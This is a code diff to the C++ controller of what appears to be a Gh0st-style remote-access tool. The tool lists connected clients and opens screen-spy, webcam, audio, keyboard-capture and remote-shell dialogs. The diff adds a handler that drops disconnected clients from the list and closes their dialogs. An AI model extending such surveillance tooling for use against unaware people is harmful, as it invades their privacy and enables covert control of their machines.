@@ -92,6 +92,8 @@ BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
 	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
 	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
+	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
+
 	
 	//-------------系统-------------
 	ON_WM_SYSCOMMAND()
@@ -133,7 +135,7 @@ void CALLBACK CCcRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, 
 		case NC_CLIENT_CONNECT:
 			break;
 		case NC_CLIENT_DISCONNECT:
-			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
+			g_pCcRemoteDlg->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
 			break;
 		case NC_TRANSMIT:
 			break;
@@ -915,9 +917,6 @@ void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	/*
 	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 		g_pCcRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_KEYBOARD_START:
-		g_pCcRemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;*/
 	case TOKEN_AUDIO_START: // 语音
 		g_pCcRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
@@ -1201,6 +1200,53 @@ LRESULT CCcRemoteDlg::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
 
 	pContext->m_Dialog[0] = KEYBOARD_DLG;
 	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
+
+LRESULT CCcRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext	*pContext = (ClientContext *)lParam;
+	if (pContext == NULL)
+		return -1;
+	// 删除链表过程中可能会删除Context
+	CString strIP;//选择断开的IP
+	try
+	{
+		int nCnt = m_CList_Online.GetItemCount();
+		for (int i = 0; i < nCnt; i++)
+		{
+			if (pContext == (ClientContext *)m_CList_Online.GetItemData(i))
+			{
+				strIP = m_CList_Online.GetItemText(i, ONLINELIST_IP);//获取断开的IP字符串
+				strIP += "下线";
+				ShowMessage(true, strIP);//显示日志// 更新当前连接总数
+				m_CList_Online.DeleteItem(i);
+				break;
+			}
+		}
+
+		// 关闭相关窗口
+
+		switch (pContext->m_Dialog[0])
+		{
+		case FILEMANAGER_DLG:
+		case SCREENSPY_DLG:
+		case WEBCAM_DLG:
+		case AUDIO_DLG:
+		case KEYBOARD_DLG:
+		case SYSTEM_DLG:
+		case SHELL_DLG:
+			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
+			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
+			break;
+		default:
+			break;
+		}
+	}
+	catch (...) {}
+
+
+
 	return 0;
 }
 
